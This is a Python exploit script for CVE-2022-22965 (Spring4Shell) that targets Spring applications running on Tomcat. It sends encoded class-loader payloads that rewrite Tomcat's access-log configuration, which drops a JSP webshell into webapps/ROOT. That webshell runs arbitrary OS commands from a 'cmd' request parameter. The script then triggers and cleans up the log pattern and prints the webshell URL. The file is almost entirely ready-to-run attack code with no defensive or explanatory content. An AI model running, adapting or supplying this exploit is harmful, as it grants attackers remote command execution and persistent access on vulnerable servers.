from argparse import ArgumentParser
from requests import post, get
from urllib.parse import quote, urlparse
import urllib3
import time

urllib3.disable_warnings()

def argv():
        parser = ArgumentParser(description='CVE-2022-22965 RCE Exploit')
        
        parser.add_argument('--url', help='target url EX) --url=http://localhost:8080', default="http://localhost:8080/exploit/greeting", dest="target", required=True)
        parser.add_argument('--file', help='WebShell file name to write to EX) --file=cmd', default="cmd")
        parser.add_argument('--dir', help='WebShell Directory Path to Write to. EX) --dir=webapps/ROOT',  default="webapps/ROOT")
        
        args = parser.parse_args()

        return args.file, args.dir, args.target


def exploit():
    filename, directory, target = argv()

    print(f"\033[92m[+] INFO - Target URL : {target}\033[0m")

    parse_target = urlparse(target)
    shellurl = f"{parse_target.scheme}://{parse_target.netloc}/{filename}.jsp"

    if get(shellurl).status_code != 404:
        print(f"\033[91m[-] WARNING - The same file name already exists. please try another name [{filename}]\033[0m")
        return

    post_headers = {"Content-Type": "application/x-www-form-urlencoded"}

    template_variables = {
        'directive':'<%@',
        'endtag':'%>',
        'starttag':'<%',
        'parameter':'cmd'
    }

    webshell= """%{directive}i page import="java.util.*,java.io.*" %{endtag}i
    %{starttag}i if(request.getParameter("%{parameter}i") != null){Process p = Runtime.getRuntime().exec(request.getParameter("%{parameter}i"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}} %{endtag}i
    """

    payloads = [
        f'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%64%69%72%65%63%74%69%76%65%7d%69%20%70%61%67%65%20%69%6d%70%6f%72%74%3d%22%6a%61%76%61%2e%75%74%69%6c%2e%2a%2c%6a%61%76%61%2e%69%6f%2e%2a%22%20%25%7b%65%6e%64%74%61%67%7d%69%0a%20%20%20%20%25%7b%73%74%61%72%74%74%61%67%7d%69%20%69%66%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%25%7b%70%61%72%61%6d%65%74%65%72%7d%69%22%29%20%21%3d%20%6e%75%6c%6c%29%7b%50%72%6f%63%65%73%73%20%70%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%25%7b%70%61%72%61%6d%65%74%65%72%7d%69%22%29%29%3b%4f%75%74%70%75%74%53%74%72%65%61%6d%20%6f%73%20%3d%20%70%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%3b%49%6e%70%75%74%53%74%72%65%61%6d%20%69%6e%20%3d%20%70%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%44%61%74%61%49%6e%70%75%74%53%74%72%65%61%6d%20%64%69%73%20%3d%20%6e%65%77%20%44%61%74%61%49%6e%70%75%74%53%74%72%65%61%6d%28%69%6e%29%3b%53%74%72%69%6e%67%20%64%69%73%72%20%3d%20%64%69%73%2e%72%65%61%64%4c%69%6e%65%28%29%3b%77%68%69%6c%65%20%28%20%64%69%73%72%20%21%3d%20%6e%75%6c%6c%20%29%20%7b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%64%69%73%72%29%3b%64%69%73%72%20%3d%20%64%69%73%2e%72%65%61%64%4c%69%6e%65%28%29%3b%7d%7d%20%25%7b%65%6e%64%74%61%67%7d%69%2f%2f',
        f'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp',
        f'class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}',
        f'class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}',
        f'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=',
    ]

    # post(target, data="class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_", headers={"Content-Type": "application/x-www-form-urlencoded"}, verify=False)
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    print("[*] Resetting Log Variables.")
    ret = post(target, headers=post_headers, data=file_date_data, verify=False)

    # pres = post(target, data={payloads[0]:webshell, payloads[1]:'.jsp', payloads[2]:directory, payloads[3]:filename, payloads[4]:''}, headers={"Content-Type": "application/x-www-form-urlencoded"}, verify=False)

    pres = post(target, data='&'.join(payloads), headers=post_headers, verify=False)
    print(pres.url)
    print(f"\033[92m[+] INFO - POST Response status code : {pres.status_code}\033[0m")

    time.sleep(3)

    gres = get(target, headers=template_variables, verify=False)
    print(f"\033[92m[+] INFO - GET Response status code : {gres.status_code}\033[0m")

    time.sleep(1)

    post(target, data="class.module.classLoader.resources.context.parent.pipeline.first.pattern=", headers=post_headers, verify=False)

    print(f"\033[92m[+] INFO - Exploit Success\033[0m\n")

    print(f"\033[95m[*] INFO - WebShell URL : {shellurl}\033[0m")

if __name__ == "__main__":
    exploit()
